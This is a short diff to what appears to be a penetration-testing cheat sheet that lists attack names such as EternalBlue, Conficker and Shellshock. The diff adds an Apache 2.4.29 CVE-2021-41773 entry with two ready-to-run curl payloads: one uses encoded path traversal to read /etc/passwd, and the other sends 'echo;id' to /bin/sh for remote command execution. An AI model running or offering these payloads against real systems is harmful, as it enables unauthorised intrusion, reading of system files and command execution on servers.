@@ -54,7 +54,13 @@ LLMNR
 EternalBlues
 smb-double-pulsar-backdoor
 smb-vuln-conficker
+
 ====================[Web]=================
+Apache 2.4.29 - CVE-2021-41773 - Path Traversal
+- proxychains curl http://127.0.0.1/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+- curl --data "echo;id" 'http://127.0.0.1:55026/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
+
+
 JAVA Remote Method Invocation (RMI)
 CGI-Shellshock
 SQLI Injections
